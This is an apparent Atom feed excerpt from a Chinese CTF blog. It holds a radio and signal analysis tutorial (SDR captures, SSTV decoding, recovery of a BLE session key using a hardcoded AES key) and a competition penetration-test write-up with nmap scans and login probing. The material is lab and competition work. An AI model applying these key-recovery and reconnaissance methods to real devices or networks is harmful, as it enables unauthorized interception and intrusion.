password'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> <span class="token string">'Invalid credentials'</span>        <span class="token keyword">finally</span><span class="token punctuation">:</span>              connection<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后在root下翻出一个flag，home下好像也有一个flag，交了俩flag</p><p>接下来应该是拿shell然后打横向，但是时间太短反应不过来（</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;赛制是 理论 + 工控ctf + 渗透or运维build&lt;/p&gt;
&lt;p&gt;理论赛本地大模型魅力时刻&lt;/p&gt;
&lt;p&gt;ctf 部分上来先考计算机网络&amp;#x2F;路由交换实践，而我还在重修计网，令人感叹（&lt;/p&gt;
&lt;p&gt;然后用 ctf 的分换取渗透&amp;#x2F;build启动环境的机会，渗透每次启动环境都只有一小时的时间能打，只能说根本打不完555&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128171247204.png&quot; alt=&quot;image-20241128171247204&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>频谱分析</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/</id>
    <published>2024-11-26T07:36:35.000Z</published>
    <updated>2024-12-23T15:32:25.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>貌似都是无线电方面的</p><span id="more"></span><hr><h1 id="利用gqrx和rtl-433分析433MHz遥控门铃信号"><a href="#利用gqrx和rtl-433分析433MHz遥控门铃信号" class="headerlink" title="利用gqrx和rtl_433分析433MHz遥控门铃信号"></a>利用gqrx和rtl_433分析433MHz遥控门铃信号</h1><p>无线遥控门铃通常工作在 ISM 频段，比如 315Mhz, 433Mhz 和868&#x2F;915Mhz</p><p>在信号调制方面则以 OOK&#x2F;ASK&#x2F;FSK 为主，这几种调制方案应用非常广泛，如无线基站，遥控钥匙和胎压系统 TPMS 都有它们的身影</p><p>在无线钥匙领域 OOK 的简单性是其它调制方案所不及的，仅需要将载波信号发送到功放和天线，即可表现 “1” 或不发射任何信号即代表 “0”</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Gqrx：开源的图形化软件定义无线电（SDR）接收器，支持频谱显示、信号调谐、解调和录制等功能</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gqrx-sdr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>rtl_433：专门用于解码来自 433 MHz 无线频段的各种设备信号，如无线温度计、气压计、门窗传感器等，支持多种信号解码方式，包括但不限于协议分析、频谱分析、调制解调等，广泛应用于物联网设备的信号破解和无线电通信的实验研究</p><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>解析信号文件，播放信号并查看信号的频谱图</p><p>尝试解读经典 433MHz 的无线门铃中的信号信息</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>在 gqrx 软件中播放并查看信号的频谱图</p><p>设置设备类型为other</p><p>Device String 参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">file</span><span class="token operator">=</span>/home/kali/桌面/rev_lab/cap433_200ksps.cf32,freq<span class="token operator">=</span><span class="token number">433920000000</span>,rate<span class="token operator">=</span><span class="token number">200000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Input rate 设置为 200000 （对应 200ksps 采样率）</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127174748076.png" alt="image-20241127174748076"></p><p>点击播放按钮，即可查看录制信号文件的频谱以及播放信号</p><p> <img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127174853730.png" alt="image-20241127174853730"></p></li><li><p>利用 rtl_443 工具解析信号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rtl_433 <span class="token parameter variable">-r</span> cap433_200ksps.cf32 <span class="token parameter variable">-A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127212031531.png" alt="image-20241127212031531"></p><p>在浏览器中打开链接，可以具体分析信号：</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241127212201727.png" alt="image-20241127212201727"></p></li></ol><hr><h1 id="利用Universal-Radio-Hacker分析2-4G遥控车信号"><a href="#利用Universal-Radio-Hacker分析2-4G遥控车信号" class="headerlink" title="利用Universal Radio Hacker分析2.4G遥控车信号"></a>利用Universal Radio Hacker分析2.4G遥控车信号</h1><p>遥控车小车的遥控器常工作在 2.4 GHz 频段，许多无线设备（如 Wi-Fi、蓝牙、无线鼠标等）也使用 2.4 GHz 频段</p><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><p>Universal Radio Hacker（简称 URH）是一个开源的软件工具，专门用于无线电信号的分析、解码和破解。它允许用户通过软件定义无线电（SDR）硬件（如 RTL-SDR、HackRF）捕捉和分析无线电信号，支持从低频到高频范围的信号捕获。URH 提供了图形化界面，能够进行详细的信号分析，帮助用户识别各种无线协议，包括调频（FM）、幅度调制（AM）、调频调制（FSK）、ASK、OOK 等多种调制方式。它还允许用户以可视化的方式查看信号波形、频谱图和水晶图，从而更好地理解信号特性</p><p>URH 具有强大的信号分析功能，不仅可以录制和播放信号，还支持信号的解调和分析，自动化的协议解析功能，帮助用户快速破解和理解无线协议。此外，URH 还允许用户在发现信号之后对其进行解码、重放，并根据需要修改协议参数进行实验</p><h2 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h2><ul><li>解读并分析 2.4GHz 遥控车的信号</li><li>尝试分析信号协议的格式</li></ul><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>打开并分析信号</p><p>点击Autodetect parameters按钮，可以直接自动分析信号的基本参数以及调制信息</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144206946.png" alt="image-20241202144206946"></p><p>信号中的这些部分是环境中的噪声干扰，可以用鼠标滑动选中后直接按键盘上的 Delete 按钮删除</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144415182.png" alt="image-20241202144415182"></p><p>微调Noise部分，使得粉红色区域能覆盖掉所有的底噪</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144745965.png" alt="image-20241202144745965"></p><p>Modulation 选择 FSK ，此时再次点击 Autodetect parameters 按钮，即可分析2.4G遥控器的信号内容：</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202144900553.png" alt="image-20241202144900553"></p></li><li><p>尝试分析协议格式</p><p>点击 Analysis 菜单，选择 Analyze Protocol 即会自动执行针对协议的分析</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202145247170.png" alt="image-20241202145247170"></p><p>观察分析的结果，可以发现二进制串多为以下格式：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">00110011 00110010110011 0001111111110110 11010110011 001100110101010011011 00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测对应的是操控小车的操作</p></li></ol><hr><h1 id="利用GNU-Radio-Compaion和qsstv解调卫星传输的图像"><a href="#利用GNU-Radio-Compaion和qsstv解调卫星传输的图像" class="headerlink" title="利用GNU Radio Compaion和qsstv解调卫星传输的图像"></a>利用GNU Radio Compaion和qsstv解调卫星传输的图像</h1><p>SSTV技术本身比较简单，它使用模拟信号将图像“编码”并通过无线电波传输。传输过程中的图像会被分割成多条扫描线，每一条扫描线通过无线电信号发送，并被地面接收站解码为完整的图像。这种方式不需要复杂的数字数据连接，适合在无线电频段上使用，尤其是像太空站这种远离地面的场景</p><h2 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h2><p>GNU Radio Companion (GRC) 是一个开源的软件开发环境，专为信号处理而设计，特别是在无线通信和无线电频谱分析方面。它提供了一个图形化界面，允许用户通过“块”来构建无线电系统，而无需编写复杂的代码。这些“块”是不同的信号处理模块，如滤波器、调制解调器、放大器等，可以被用户拖放到工作区，并通过连接来组成信号处理链。GNU Radio Companion广泛用于软件定义无线电（SDR）应用中，支持实时信号处理，可以用于教育、研究和实际的通信系统设计。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnuradio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>QSSTV 是一款专门用于接收和发送 SSTV（慢扫描电视）信号的软件，通常用于业余无线电通信。它能够通过电脑与无线电设备的连接，解码 ISS 等发射的 SSTV 信号，并将其转化为图像文件。QSSTV支持多种常见的 SSTV 模式，如 Robot 36 和 Martin 1 等，并能将接收到的图像显示出来。它也是无线电爱好者和业余无线电操作员常用的工具之一，能够与标准的SSTV发射器和接收器兼容，适用于爱好者捕捉和分享来自太空的图像</p><h2 id="目的-2"><a href="#目的-2" class="headerlink" title="目的"></a>目的</h2><ul><li>解调模拟的卫星信号文件</li><li>解码SSTV信号，并尝试提取其中的图像</li></ul><h2 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>利用GNU Radio对信号源文件进行FM解调</p><p>源文件名 <code>fm-complex64-sample_rate-48khz-dec_ratio-3_1</code> 中已经包含了一些和信号有关的信息</p><ul><li>fm：调制类型</li><li>complex64：信号数据类型</li><li>sample_rate-48khz：采样率</li><li>dec_ratio-3_1：抽取率（原始信号与实际有效信号之比，这里是 3:1）</li></ul></li><li><p>打开GNU Radio，新建一个项目文件，双击 samp_rate 选项卡，将值改为 48000：</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195538819.png" alt="image-20241202195538819"></p><p>点击搜索按钮，输入 File Source，双击搜索到的 File Souce 选项卡</p><p>将出现的模块拖到最左边，双击，在 File 一栏中输入信号文件的路径，Repeat 改为 No</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195724016.png" alt="image-20241202195724016"></p><p>继续搜索：Rational Resampler，拖动到File模块的右边</p><p>拖动 File 的 Out，与 Rational Resampler 的 In 相连</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202195904525.png" alt="image-20241202195904525"></p><p>用同样的方法查找并添加 NBFM Receive 模块，并连接流程图</p><p>双击 NBFM Receive 模块，填写参数：</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200026828.png" alt="image-20241202200026828"></p><p>需要注意的是，Audio Rate 是降采样后的频率，Quadrature Rate 才是信号的原始频率，由于抽取率是3:1，因此音频的频率是48&#x2F;3&#x3D;16kHz</p><p>用同样的方法添加 Wav File Sink 模块，并连接</p><p>双击编辑参数，File 一栏填写需要保存的文件路径，Sample Rate 一栏改为 int(samp_rate&#x2F;3) 或者 16000</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200339633.png" alt="image-20241202200339633"></p><p>保存后，点击右上角的运行按钮，来运行流程图</p><p>几秒钟后，在对应的文件夹中就出现了 wav 文件</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202200557649.png" alt="image-20241202200557649"></p></li><li><p>利用 Audacity 查看并转换解调的信号文件</p><p>打开 Audacity，并在 File -&gt; Open 导入刚刚的 wav 文件</p><p>点击 File -&gt; Export Audio，Export to Computer</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202426601.png" alt="image-20241202202426601"></p></li><li><p>利用 qsstv 将信号中的音频转换成图片</p><p>Options -&gt; Configuration</p><p>Sound 选项卡中的 Sound Input 改为 From File，点击OK保存</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202656527.png" alt="image-20241202202656527"></p><p>在 Receive 选项卡中，点击播放按钮，选择刚刚 Audacity 导出的 wav 文件</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202202722020.png" alt="image-20241202202722020"></p><p>即会自动对刚刚的 wav 文件中的音频进行 SSTV 解码</p></li><li><p>此图片在 ISCTF2024 中亦有记载</p><p>可以看到这里面是被拆了的二维码点阵，缺了一角是定位点</p><p>直接去 QRazybox 手动修复：<a href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a></p><p>注意尺寸是29*29</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202210730691.png" alt="image-20241202210730691"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202210827890.png" alt="image-20241202210827890"></p><p>得到flag：<code>ISCTF&#123;Th3_ROmaNtic_Of_Rad1o&#125;</code></p></li></ol><hr><h1 id="分析低功耗蓝牙设备的BLE数据包获取智能设备BLE通信密钥"><a href="#分析低功耗蓝牙设备的BLE数据包获取智能设备BLE通信密钥" class="headerlink" title="分析低功耗蓝牙设备的BLE数据包获取智能设备BLE通信密钥"></a>分析低功耗蓝牙设备的BLE数据包获取智能设备BLE通信密钥</h1><p>IOT 中，低功耗蓝牙协议（BLE）广泛应用于智能设备之间的通信，如智能手表、智能家居设备、无线耳机等</p><p>BLE（Bluetooth Low Energy）协议采用主从架构，通常由一个“主设备”和多个“从设备”组成，支持多种操作模式以确保高效和低能耗通信，协议的常见操作：</p><ul><li>广播（Advertising）：BLE设备通过广播数据包来通知周围的设备其存在，这些广播数据包不需要与其他设备建立连接，因此被称为无连接广播。广播数据包可以包含设备的基本信息、服务UUID（服务标识符）、制造商信息等。广播操作通常用于发现设备、获取设备信息或启动配对过程<ul><li>广告包结构：广告包（Advertising Packet）通常包含一个设备地址、广播数据、广告间隔等信息。广告间隔是指BLE设备发送广告数据包的频率</li></ul></li><li>扫描（Scanning）：BLE设备可以通过扫描来接收其他设备的广播数据包。扫描分为主动扫描和被动扫描两种方式。主动扫描时，设备会主动向广播设备发送扫描请求，从而获取更多的信息；而被动扫描时，设备仅接收广播数据包。</li><li>连接（Connection）：连接是BLE设备间进行通信的基础。一旦BLE设备通过广播发现了目标设备并完成了配对或配对后建立了连接，设备就可以交换数据。BLE连接通过连接请求（Connection Request）和连接响应（Connection Response）过程来完成。<ul><li>连接过程通常包括设备地址交换、协商连接参数（如连接间隔、数据包大小等）等步骤</li><li>连接完成后，设备通过数据包交换进行通信</li></ul></li><li>数据传输（Data Exchange）：在BLE连接中，数据传输是通过数据包进行的。数据包包含了通信双方交换的数据内容、特征值（Characteristics）等信息。BLE支持通过GATT（Generic Attribute Profile）协议来进行数据传输，GATT定义了通信中的服务（Services）、特征（Characteristics）和描述符（Descriptors）。<ul><li>读取和写入操作：设备可以通过GATT进行属性读取（Read）或写入（Write）操作，这些操作可以应用于设备的各种传感器数据、配置信息等</li></ul></li><li>配对与加密（Pairing and Encryption）：BLE协议支持设备配对和加密操作，以提高通信安全性。配对过程中，设备交换配对信息，如加密密钥或确认码。BLE支持多种安全模式，如 Just Works、Passkey Entry 和 Out of Band，以及加密机制来保护数据安全。<ul><li>加密数据：通过交换加密密钥，BLE通信中的数据流可以被加密，以防止恶意监听和数据篡改。</li></ul></li><li>断开连接（Disconnection）：在BLE设备完成数据交换后，可以通过发送断开连接的命令（Disconnection Request）来中止连接。设备之间的连接通常是短暂的，设计上是为了降低能耗</li></ul><hr><h2 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h2><p>通过逆向该设备的 app 可知，app 与设备的交互使用了 session_key 作为每次连接后的AES会话密钥，这个密钥在每次连接配对时交换产生，在每次断联后被废弃，下次重新生成</p><p>session_key 生成规则：</p><ol><li><p>app与设备建立连接，交换设备型号版本等必要信息。</p></li><li><p>app订阅智能设备UUID为 <code>bd4ac6100b4511e38ffd0800200c9a66</code> 的Indication。</p></li><li><p>由 app 先生成 8 byte 的随机数A，由控制字符 <code>01000000 +[8 byte随机数A]+[4 byte其他字符]</code> 组成一个指令，由固定密钥 <code>2eacd8f48c2dfe15325f25ad8fc8eb96</code> 加密后，加上 2 Byte 的CRC内容（有效数据为前 16 byte），Write 给目标设备 UUID 为<code>bd4ac6100b4511e38ffd0800200c9a66</code> 的服务。</p></li><li><p>智能设备收到上述指令后，生成 8 byte 的随机数B，由控制字符 <code>02000000 +[8 byte随机数B]+[4byte其他字符]</code> 组合指令，由固定密钥 <code>2eacd8f48c2dfe15325f25ad8fc8eb96</code> 加密后，加上 2 Byte 的其他数据（有效数据为前 16 byte），通过 Indicate 订阅返还给app。</p></li><li><p>app与智能设备完成密钥交换，令 <code>session_key=A+B</code> ，即为本次通信使⽤的 AES 密钥，本次会话后续所有通信均由 session_key 进行加密后再传输。</p></li></ol><h2 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤"></a>步骤</h2><ol><li><p>用 Wireshark 分析无线电嗅探设备捕获的数据包</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202212132680.png" alt="image-20241202212132680"></p><p>有显示通信来源、目的地、BLE数据包类型，例如 ADV_IND 是 BLE 协议中最常见的广播类型，主要用于设备的可发现广播</p><p>这种数据包用于通知附近的设备它的存在，常见于设备希望让其他设备发现并连接到它时。例如，当⼀个 BLE 设备启动并希望被其他设备发现时，它会发送 ADV_IND 类型的广播包。</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213408567.png" alt="image-20241202213408567"></p><p>展开 Bluetooth Attribute Protocol 选项树，可以看到详细的应用层信息。例如92号数据包是交换设备名称等变量</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213621082.png" alt="image-20241202213621082"></p><p>最终找到216号数据包，逆向app后已知的交换随机数密钥的 Service UUID：<code>bd4ac6100b4511e38ffd0800200c9a66</code></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202213743333.png" alt="image-20241202213743333"></p></li><li><p>解密并还原 session_key</p><p>key 用的是前面逆向得到的 2eacd8f48c2dfe15325f25ad8fc8eb96</p><p>iv 用0填充</p><p>CBC&#x2F;NoPadding 模式</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214653482.png" alt="image-20241202214653482"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214712162.png" alt="image-20241202214712162"></p><p>得到 A 为 c2f4c40274acbc32</p><p>在220号数据包拿到另一个UUID</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214325525.png" alt="image-20241202214325525"></p><p>同样解密得到 B 为 616b507c0e066eee</p><p>那么得到 session_key &#x3D; A + B &#x3D; c2f4c40274acbc32616b507c0e066eee</p><p>继续找到⼀个后续的交互数据包，尝试用这个 session_key 解密</p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214844605.png" alt="image-20241202214844605"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214831498.png" alt="image-20241202214831498"></p><p><img src="/blog/2024/11/26/%E9%A2%91%E8%B0%B1%E5%88%86%E6%9E%90/image-20241202214925813.png" alt="image-20241202214925813"></p><p>说明 c2f4c40274acbc32616b507c0e066eee 就是加密后续 BLE 数据包的有效 session_key</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;貌似都是无线电方面的&lt;/p&gt;</summary>
    
    
    
    <category term="杂项" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>2024网鼎杯半决赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</id>
    <published>2024-11-23T01:50:26.000Z</published>
    <updated>2024-12-03T08:53:24.618Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>谁偷走了我的云支付首页手机号弱密码登录！</p><p>ctf没有web，<del>渗透还寄了</del>，可惜队友安全运营一个第3一个第8了，遗憾退场</p><p>参考：<a href="https://blog.csdn.net/qq_30817059/article/details/144030914#t5">https://blog.csdn.net/qq_30817059/article/details/144030914#t5</a></p><span id="more"></span><hr><h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><h1 id="ip探测"><a href="#ip探测" class="headerlink" title="ip探测"></a>ip探测</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">114.114.114.1 是存活地址114.114.114.20 是存活地址- 在线客服系统//114.114.114.44 是存活地址- 工具平台//114.114.114.55 是存活地址//114.114.114.88 是存活地址114.114.114.100 是存活地址- 80 - 致富国际114.114.114.199 是存活地址- 80 - 恒丰IPO114.114.114.229 是存活地址- 44514 - 云支付114.114.114.253 是存活地址114.114.114.254 是存活地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="首页入口-114-114-114-100"><a href="#首页入口-114-114-114-100" class="headerlink" title="首页入口-114.114.114.100"></a>首页入口-114.114.114.100</h1><h2 id="app逆向"><a href="#app逆向" class="headerlink" title="app逆向"></a>app逆向</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203150821945.png" alt="image-20241203150821945"></p><p>首页二维码扫出来的链接为</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;114.114.114.100&#x2F;apk&#x2F;apk-release.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反编译apk，搜flag</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241123100357678.png" alt="image-20241123100357678"></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151225193.png" alt="image-20241203151225193"></p><p>没东西</p><p>nmap</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped80/tcp    open  http       nginx|_http-title: \xE8\x87\xB4\xE5\xAF\x8C\xE5\x9B\xBD\xE9\x99\x85110/tcp   open  tcpwrapped111/tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      32780/tcp   mountd|   100005  1,2,3      32780/tcp6  mountd|   100005  1,2,3      32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status2049/tcp  open  nfs        3-4 (RPC #100003)32780/tcp open  mountd     1-3 (RPC #100005)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="恒汇IPO-114-114-114-199（复现）"><a href="#恒汇IPO-114-114-114-199（复现）" class="headerlink" title="恒汇IPO-114.114.114.199（复现）"></a>恒汇IPO-114.114.114.199（复现）</h1><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203151014947.png" alt="image-20241203151014947"></p><p>模块架构的访问方式，dirsearch扫不出有价值的信息</p><p>测出一个admin模块</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//114.114.114.199/index.php?mod=admin&amp;act=login</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203153801724.png" alt="image-20241203153801724"></p><p>弱密码爆破无果，尝试sql注入，发现卧槽挂了个G01</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203162440194.png" alt="image-20241203162440194"></p><p>测试还发现存在mobile模块，还有一个a模块，不知道为什么访问a模块会导致服务被重启（</p><p>mobile模块里面没有什么可以利用的东西</p><h2 id="扫描-1"><a href="#扫描-1" class="headerlink" title="扫描"></a>扫描</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">PORT      STATE    SERVICE    VERSION25/tcp    open     tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open     tcpwrapped80/tcp    open     http       wdb| http-title: \xE6\x81\x92\xE6\xB1\x87IPO - \xE7\x94\xA8\xE6\x88\xB7\xE7\x99\xBB\xE9\x99\x86|_Requested resource was /index.php?mod=member&amp;act=login&amp;url=P21vZD1tZW1iZXI=| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: wdb| fingerprint-strings: |   GetRequest: |     HTTP/1.1 302 Found|     Date: Sat, 23 Nov 2024 02:52:35 GMT|     Server: wdb|     Set-Cookie: PHPSESSID=9bhitpr8oir6tjjh61804b9bp7; path=/|     Expires: Thu, 19 Nov 1981 08:52:00 GMT|     Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0|     Pragma: no-cache|     Location: /index.php?mod=member|     Content-Length: 0|     Connection: close|     Content-Type: text/html;charset=utf-8|   HTTPOptions: |     HTTP/1.1 404 Not Found|     Date: Sat, 23 Nov 2024 02:52:36 GMT|     Server: wdb|     Cache-Control: no-store, no-cache, must-revalidate, 